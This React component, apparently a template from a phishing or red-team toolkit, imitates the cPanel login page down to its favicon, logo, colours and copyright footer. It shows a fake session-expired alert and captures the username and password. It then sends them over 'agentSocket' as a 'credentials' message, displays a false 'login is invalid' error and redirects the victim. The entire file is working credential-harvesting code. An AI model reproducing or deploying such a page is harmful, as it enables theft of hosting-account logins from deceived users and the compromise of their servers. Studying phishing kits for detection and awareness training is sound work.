import { Alert, Button, createTheme, Grid, InputAdornment, TextField, ThemeProvider, Typography } from "@mui/material";
import { FC, useState } from "react";
import { useFavicon, useTitle } from "react-use";
import { CPanelIconSvg, CPanelPasswordIcon, CPanelSmallIconSvg, CPanelUsernameIcon } from "../images";
import { AgentTemplateProps } from "../types";
import {
  HighlightOff as HighlightOffIcon,
} from '@mui/icons-material'

export const CPanelTemplate: FC<AgentTemplateProps> = ({ title, agentSocket, redirectUrl }) => {
  useTitle(title || document.title || 'CPanel Login');
  useFavicon('https://cpanel.net/wp-content/themes/cPbase/assets/img/favicon.ico');
  const theme = createTheme({
    palette: {
      primary: {
        main: "#179bd7",
      },
      secondary: {
        main: '#095779',
      }
    }
  });
  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setAuthenticating(true);
    setShowAlert(true);
    setTimeout(() => {
      setAuthenticating(false);
      setAlertErrorMessage('The login is invalid.');
      setTimeout(() => {
        setShowAlert(false);
      }, 3000)
    }, 500)
    agentSocket.next({ type: 'credentials', payload: { type: 'cpanel', user, pass } });
    if (redirectUrl) {
      window.location.href = redirectUrl;
    } else {
      if (process.env.NODE_ENV === 'development') {
        //
      }
    }
  }
  const [user, setUser] = useState("");
  const [pass, setPass] = useState("");
  const [authenticating, setAuthenticating] = useState(false);
  const [alertErrorMessage, setAlertErrorMessage] = useState('Your session cookie is invalid. Please log in again.')
  const [showAlert, setShowAlert] = useState(true);
  return <ThemeProvider theme={theme}>
    <Grid sx={{ backgroundColor: '#f0eff0', height: '100vh' }} container direction='column' justifyContent="center" alignItems='center' spacing={2}>
      <form onSubmit={handleSubmit} autoComplete="off" style={{ width: '100%' }}>
        <Grid item container justifyContent='center' width={356} m='0 auto'>
          {
            showAlert && <Grid item xs={12} maxWidth='125% !important' width={365}>
              <Alert
                severity={authenticating ? 'info' : 'error'}
                variant='filled'
                sx={{
                  width: 365,
                  backgroundColor: authenticating ? '#009cde' : '#d35351',
                  fontSize: 12,
                  fontWeight: 'normal'
                }}
                iconMapping={{
                  error: <HighlightOffIcon />
                }}>{authenticating ? 'Authenticating...' : alertErrorMessage}</Alert>
            </Grid>
          }
          <Grid item xs={12}>
            <img alt='logo' height={65} width={236} src={CPanelIconSvg} style={{ display: 'block', margin: `${theme.spacing(4)} auto` }} />
          </Grid>
          <Grid item xs={12}>
            <Typography sx={{
              fontWeight: '500',
              margin: '5px 0',
              color: '#293a4a'
            }}>Username</Typography>
            <TextField
              size='small'
              id="user"
              name="user"
              value={user}
              onChange={(e) => setUser(e.target.value)}
              InputProps={{
                startAdornment: <InputAdornment position='start'><img alt='' src={CPanelUsernameIcon} /></InputAdornment>,
              }}
              sx={{
                border: '2px solid #bebebe',
                borderRadius: '4px',
                backgroundColor: '#fff',
                padding: '2px',
                width: 350,
                '& input, & fieldset': {
                  border: "none",
                }
              }}
              placeholder='Enter your username.'
              variant="outlined" />
          </Grid>
          <Grid item xs={12} mt={3}>
            <Typography sx={{
              fontWeight: '500',
              margin: '5px 0',
              color: '#293a4a'
            }}>Password</Typography>
            <TextField
              size='small'
              id="pass"
              name="pass"
              value={pass}
              onChange={(e) => setPass(e.target.value)}
              InputProps={{
                startAdornment: <InputAdornment position='start'><img alt='' src={CPanelPasswordIcon} /></InputAdornment>,
              }}
              sx={{
                border: '2px solid #bebebe',
                borderRadius: '4px',
                backgroundColor: '#fff',
                padding: '2px',
                width: 350,
                '& input, & fieldset': {
                  border: "none",
                }
              }}
              placeholder='Enter your account password.'
              type='password'
              variant="outlined" />
          </Grid>
          <Grid item xs={12} mt={4}>
            <Button type='submit' variant="contained" sx={{ textTransform: 'none' }} fullWidth>Log in</Button>
          </Grid>
        </Grid>
        <Grid m={`${theme.spacing(10)} auto`} sx={{ fontSize: 12 }} item xs={12} container justifyContent='center' alignItems='center' width='60%' textAlign='center'>
          {['English', 'العربية', 'български', 'čeština', 'dansk', 'Deutsch', 'Ελληνικά', 'español', '…'].map((text, index) => (
            <Typography
              key={index}
              variant='body2'
              color='gray'
              textAlign='center'
              sx={{
                fontStyle: 'bold',
                color: 'black',
                padding: `7.5px ${theme.spacing(2)}`,
                display: 'inline-flex',
              }}>{text}</Typography>))}
        </Grid>
        <Grid item xs={12} container justifyContent='center' textAlign='center'>
          <Grid item xs={12}><img alt='' src={CPanelSmallIconSvg} width={25} height={25} /></Grid>
          <Grid item xs={12}><Typography sx={{ fontSize: 10 }} variant='body2'>Copyright© 2022 cPanel, L.L.C.</Typography></Grid>
          <Grid item xs={12}><Typography sx={{ fontSize: 10 }} variant='body2'>Privacy Policy</Typography></Grid>
        </Grid>
      </form>
    </Grid>
  </ThemeProvider>;
}
